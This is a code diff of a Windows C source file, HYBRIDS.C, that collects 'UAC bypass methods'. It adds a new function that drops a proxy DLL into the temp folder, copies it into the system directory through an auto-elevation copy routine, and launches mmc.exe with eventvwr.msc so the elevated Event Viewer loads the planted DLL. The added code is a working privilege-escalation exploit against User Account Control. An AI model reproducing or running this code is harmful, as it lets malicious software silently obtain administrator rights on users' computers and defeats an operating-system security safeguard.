@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     1.80
+*  VERSION:     1.90
 *
-*  DATE:        11 Jul 2015
+*  DATE:        17 Sept 2015
 *
 *  Hybrid UAC bypass methods.
 *
@@ -194,7 +194,7 @@ BOOL ucmWinSATMethod(
 
 		//put target dll
 		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		_strcpy_w(szBuffer, L"%temp%\\");
+		_strcpy_w(szBuffer, TEMPDIR);
 		_strcat_w(szBuffer, lpTargetDll);
 
 
@@ -299,6 +299,87 @@ BOOL ucmWinSATMethod(
 	if (szSource[0] != 0) {
 		DeleteFileW(szSource);
 	}
+
+	return bResult;
+}
+
+/*
+* ucmMMCMethod
+*
+* Purpose:
+*
+* Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
+*
+*/
+BOOL ucmMMCMethod(
+	LPWSTR lpTargetDll,
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
+	)
+{
+	BOOL bResult = FALSE, cond = FALSE;
+	WCHAR szSource[MAX_PATH + 1];
+	WCHAR szDest[MAX_PATH + 1];
+	WCHAR szBuffer[MAX_PATH + 1];
+
+	if (
+		(ProxyDll == NULL) ||
+		(ProxyDllSize == 0) ||
+		(lpTargetDll == NULL)
+		)
+	{
+		return bResult;
+	}
+
+	if (_strlen_w(lpTargetDll) > 100) {
+		return bResult;
+	}
+
+	RtlSecureZeroMemory(szSource, sizeof(szSource));
+	RtlSecureZeroMemory(szDest, sizeof(szDest));
+
+	do {
+
+		//put target dll
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(szBuffer, TEMPDIR);
+		_strcat_w(szBuffer, lpTargetDll);
+
+		//expand string for proxy dll
+		RtlSecureZeroMemory(szSource, sizeof(szSource));
+		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
+			break;
+		}
+
+		//write proxy dll to disk
+		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			break;
+		}
+		else {
+			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
+		}
+
+		//expand string for target dir
+		RtlSecureZeroMemory(szDest, sizeof(szDest));
+		if (ExpandEnvironmentStringsW(SYSTEMROOTDIR,
+			szDest, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		//drop fubuki to system32
+		bResult = ucmAutoElevateCopyFile(szSource, szDest);
+		if (!bResult) {
+			break;
+		}
+
+		//run mmc console
+		//because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command
+		//event viewer will attempt to load not existing dll, so we will give him our little friend
+		bResult = supRunProcess(L"mmc.exe", L"eventvwr.msc");
+
+	} while (cond);
 
 	return bResult;
 }
